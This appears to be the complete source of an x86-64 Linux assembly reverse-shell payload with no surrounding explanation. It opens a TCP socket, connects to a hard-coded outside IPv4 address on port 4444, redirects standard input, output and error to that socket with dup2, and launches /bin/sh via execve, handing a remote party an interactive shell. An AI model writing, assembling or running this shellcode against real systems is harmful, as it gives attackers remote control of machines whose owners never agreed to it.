global _start

_start:
  ;int socket(int domain, int type, int protocol)
  mov rax, 0x29 ; syscall 41
  mov rdi, 0x2 ; AF_INET
  mov rsi, 0x1 ; SOCK_STREAM
  mov rdx, 0
  syscall

  mov rdi, rax
  xor rax, rax
  push rax

  ; address
  mov dword [rsp-4], 0x01f4efbf
  mov word [rsp-6], 0x5c11 ; port
  mov word [rsp-8], 0x2 ; AF_INET
  sub rsp, 8

  ; connect(int sockfd, *addrss, socklen_t)
  mov rax, 0x2a ; syscall 42
  mov rsi, rsp
  mov rdx, 0x10
  syscall

  ; dup2(oldfd. newfd)
  mov rax, 0x21
  mov rsi, 0
  syscall

  mov rax, 0x21
  mov rsi, 1
  syscall

  mov rax, 0x21
  mov rsi, 2
  syscall

  xor rax, rax
  push rax

; execve(*filename, argv[], envp[])
  mov rbx, 0x68732f2f6e69622f
  push rbx

  mov rdi, rsp
  push rax
  mov rdx, rsp
  push rdi
  mov rsi, rsp
  add rax, 0x3b ; syscall 59
  syscall
